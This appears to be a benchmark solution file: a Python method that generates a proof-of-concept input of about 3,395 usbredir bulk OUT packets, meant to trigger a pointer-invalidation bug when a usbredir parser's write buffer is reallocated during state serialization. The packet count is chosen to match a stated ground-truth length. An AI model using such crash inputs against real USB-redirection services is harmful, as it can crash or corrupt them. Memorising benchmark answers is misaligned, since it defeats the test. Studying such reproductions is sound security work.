import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        USB_REDIR_BULK_PACKET = 5

        def create_bulk_out_packet(endpoint: int, data: bytes) -> bytes:
            """
            Creates a single usbredir bulk packet.
            """
            packet_type = USB_REDIR_BULK_PACKET
            data_len = len(data)
            
            # struct usbredir_bulk_packet {
            #     uint32_t endpoint;
            #     uint32_t length;
            #     uint32_t stream_id;
            # }; -> 12 bytes
            struct_len = 12
            
            # struct usbredir_header {
            #     uint32_t type;
            #     uint32_t length;
            # }; -> 8 bytes
            # The length field in the header is for the payload that follows.
            header = struct.pack('<II', packet_type, struct_len + data_len)
            
            # An OUT endpoint must not have the 0x80 bit set.
            bulk_packet_struct = struct.pack('<III', endpoint, data_len, 0)
            
            return header + bulk_packet_struct + data

        poc_bytes = bytearray()
        
        # The vulnerability is triggered when serializing a parser state with
        # a large amount of buffered write data, causing a reallocation of the
        # state buffer (default 64kB) and invalidating a pointer.
        # We construct a PoC by sending a stream of bulk OUT packets to fill
        # this buffer. The ground-truth PoC length of 71298 bytes is our target.

        # A standard packet with 1 byte of data has a wire size of:
        # 8 (header) + 12 (bulk_packet struct) + 1 (data) = 21 bytes.
        
        # To reach 71298 bytes: 71298 / 21 = 3395.14...
        # We can construct this by using 3394 packets of 21 bytes and one
        # final packet to make up the difference.
        # 3394 * 21 = 71274 bytes.
        # 71298 - 71274 = 24 bytes remaining.
        
        # A 24-byte packet consists of:
        # 8 (header) + 16 (payload)
        # payload = 12 (struct) + 4 (data)
        
        endpoint = 0x01  # A standard BULK OUT endpoint
        num_packets_with_1_byte_data = 3394
        
        # Generate the main sequence of packets
        for _ in range(num_packets_with_1_byte_data):
            packet = create_bulk_out_packet(endpoint, b'\x00')
            poc_bytes.extend(packet)
            
        # Generate the final packet to match the exact length
        final_packet_data = b'\x00\x00\x00\x00'
        final_packet = create_bulk_out_packet(endpoint, final_packet_data)
        poc_bytes.extend(final_packet)

        return bytes(poc_bytes)
